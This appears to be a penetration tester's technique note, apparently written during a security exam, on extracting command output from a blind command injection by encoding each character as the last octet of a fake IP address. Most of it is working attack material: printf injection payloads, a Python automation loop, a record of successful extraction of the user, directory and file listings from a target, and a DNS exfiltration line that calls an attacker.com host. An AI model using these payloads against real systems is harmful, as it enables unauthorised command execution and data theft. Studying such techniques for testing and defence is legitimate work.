# Blind RCE Output Exfiltration via IP-Format Printf

## Trigger
- Confirmed blind command injection (time-based: ;sleep N causes delay)
- Application parses command output for IP address patterns only
- Output not reflected unless it matches IP regex (e.g., X.X.X.X)
- No write access to webroot (can't drop webshell)
- No outbound network for exfil (can't curl to listener)

## Technique

### Core Idea
Encode command output character-by-character as the last octet of a fake IP address.
The app displays anything matching IP format, so `printf "1.1.1.%d"` with an ASCII value
will be shown in the response as "IP Address: 1.1.1.{ascii_val}".

### Payload Pattern
```
;printf "1.1.1.%d" "'$(COMMAND|cut -cN)"
```

The `'$( )` construct: single-quote before a char gives its ASCII decimal value in printf %d.

### Example: Exfiltrate `whoami` char by char
```
;printf "1.1.1.%d" "'$(whoami|cut -c1)"  → IP Address: 1.1.1.119  (w=119)
;printf "1.1.1.%d" "'$(whoami|cut -c2)"  → IP Address: 1.1.1.119  (w=119)
;printf "1.1.1.%d" "'$(whoami|cut -c3)"  → IP Address: 1.1.1.119  (w=119)
...when cut returns empty → printf outputs 1.1.1.0 → stop (null = end of string)
```

### Python Automation
```python
def exfil(cmd, max_len=100):
    output = ""
    for i in range(1, max_len+1):
        payload = ';printf "1.1.1.%d" "\'$(' + cmd + '|cut -c' + str(i) + ')"'
        r = inject(payload)  # your injection function
        if "IP Address:" in r:
            val = int(r.replace("IP Address:", "").strip().split(".")[-1])
            if val == 0:
                break
            output += chr(val)
        else:
            break
    return output
```

### Speed: ~1 request per character
- whoami (8 chars) = 9 requests
- pwd (12 chars) = 13 requests
- Long outputs (200+ chars) = slow but works

### Faster Variant: 4 bytes per request
Encode 4 chars as 4 octets of a single IP. Harder to implement but 4x faster.

## Confirmed Working (SecOps exam, June 2026)
- Target: Domain-IP Converter using `shell_exec("dig +short " . $domain)`
- Injection: `;printf "1.1.1.%d" "'$(cmd|cut -cN)"`
- Results obtained: whoami=www-data, pwd=/var/www/html, id output, file listings
- Blind confirmation: `;sleep 3` caused 3.37s delay (baseline 0.35s)

## Limitations
- Slow (1 char per request)
- Can't handle binary output
- If command output contains newlines, `cut -c` still works across them
- Some special chars may break printf (test with known values first)

## Alternative Exfil When IP-Only Fails
- Write to /tmp, exfil via another vector
- DNS exfil: `$(cmd|base64).attacker.com` if outbound DNS allowed
- Time-based bit exfil (extremely slow, last resort)
